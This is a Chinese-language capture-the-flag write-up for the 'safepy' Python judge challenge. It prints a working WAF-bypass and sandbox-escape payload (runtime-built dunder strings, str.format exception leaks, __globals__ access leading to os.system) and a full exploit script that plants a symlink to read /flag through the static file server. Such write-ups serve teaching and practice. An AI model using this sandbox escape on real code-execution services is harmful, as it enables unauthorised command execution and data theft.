# safepy

## Flag

`flag{52caedb8-261f-45ca-a758-969641ea7f43}`

## 题目分析

首页是一个伪装成 LeetCode 判题的 Python 代码提交器，前端会把 `code` 和 `name` POST 到 `/api`。

先用正常代码探测接口，可以发现真正能进入判题的是：

```python
def isPalindrome(input):
    return input == input[::-1]
```

如果写成 `def isPalindrome(self, input):` 会直接 `Exception`，说明后端是直接把 `isPalindrome` 当一元函数喂给 `map()`。

后面通过拿到源码，确认后端逻辑如下：

```python
# server.py
cmd = ['timeout', '-s', 'KILL', os.environ.get('TIMEOUT', '10'),
       'sudo', '-u', 'ctf', 'python', 'waf.py', code]
```

```python
# waf.py
def check(code_obj):
    for obj in code_obj.co_names + code_obj.co_consts:
        if type(obj) is str and ("__" in obj or obj in BLACKLIST_ATTRS):
            raise Exception

    opcodes = {instruction.opcode for instruction in dis.get_instructions(code_obj)}
    if opcodes.intersection(BLACKLIST_OPCODES):
        raise Exception
```

关键点有两个：

1. 题目只禁止源码里直接出现 `"__"`，以及少量危险 opcode。
2. 用户代码是用 `sudo -u ctf python waf.py code` 跑的，但 Web 服务本身仍由更高权限的 `gunicorn` 提供。

`entrypoint.sh` 里还能看到：

```sh
echo $ICQ_FLAG > /flag
chmod 400 /flag
gunicorn -b 0.0.0.0:8000 -w "${WORKER:-4}" 'server:app'
```

也就是说：

- `/flag` 存在
- 当前代码执行身份是 `ctf`
- `ctf` 不能直接读 `/flag`
- 但静态文件服务进程能读

## WAF 绕过

虽然源码里不能直接写 `__globals__`、`__subclasses__`，但可以运行时拼接：

```python
u = chr(95) + chr(95)
s = "{0." + u + "subclasses" + u + ".lol}"
```

再利用 `str.format()` 的字段访问能力取对象属性。为了把真实对象从格式化异常里捞出来，可以故意访问一个不存在的属性 `.lol`，然后在 `except Exception as e:` 中读取 `e.obj`。

例如：

```python
u = chr(95) + chr(95)
s = "{0." + u + "subclasses" + u + ".lol}"
try:
    s.format(int.mro()[1])   # int.mro()[1] == object
except Exception as e:
    sc = e.obj               # sc 就是 object.__subclasses__
```

接着可以继续取 Python 类的 `__init__.__globals__`：

```python
cls = [x for x in sc() if "_wrap_close" in str(x)][0]
s2 = "{0." + u + "init" + u + "." + u + "globals" + u + ".lol}"
try:
    s2.format(cls)
except Exception as e:
    g = e.obj
```

这里 `g` 里能拿到：

- `g['sys']`
- `g['open']`

再通过 `g['sys'].modules['os']` 获得 `os`，从而实现命令执行。

## 提权思路

直接 `open('/flag')` 会失败，因为判题代码以 `ctf` 身份运行，而 `/flag` 是 `0400 root`。

但 `/app/static` 对 `ctf` 可写，而静态文件由 Web 服务返回。最短利用链就是：

1. 以 `ctf` 身份在 `/app/static` 下创建一个指向 `/flag` 的符号链接
2. 访问 `/static/flaglink`
3. 由高权限 Web 服务替我们读取真实的 `/flag`

## 利用脚本

```python
import requests

BASE = "https://eci-2ze39udipdi5hcs59775.cloudeci1.ichunqiu.com:8000"

payload = r'''
def isPalindrome(input):
    u = chr(95) + chr(95)

    s1 = "{0." + u + "subclasses" + u + ".lol}"
    try:
        s1.format(int.mro()[1])
    except Exception as e:
        sc = e.obj

    cls = [x for x in sc() if "_wrap_close" in str(x)][0]

    s2 = "{0." + u + "init" + u + "." + u + "globals" + u + ".lol}"
    try:
        s2.format(cls)
    except Exception as e:
        g = e.obj

    os = g["sys"].modules["os"]
    os.system("rm -f /app/static/flaglink")
    os.system("ln -s /flag /app/static/flaglink")
    return input == input[::-1]
'''

r = requests.post(
    BASE + "/api",
    json={"code": payload, "name": "tester"},
    verify=False,
)
print(r.text)

r = requests.get(BASE + "/static/flaglink", verify=False)
print(r.text)
```

## 利用结果

执行后访问：

```text
/static/flaglink
```

得到：

```text
flag{52caedb8-261f-45ca-a758-969641ea7f43}
```

## 总结

这题的核心不是直接从被裁剪过的 `__builtins__` 里逃，而是：

1. 用运行时拼接字符串绕过 `__` 黑名单
2. 用 `str.format()` 的属性访问和异常对象 `e.obj` 取回真实目标
3. 从 `object.__subclasses__()` 找到 Python 类，再拿 `__init__.__globals__`
4. 已有 `ctf` 命令执行后，不硬啃 root，而是利用静态文件服务的权限差读取 `/flag`
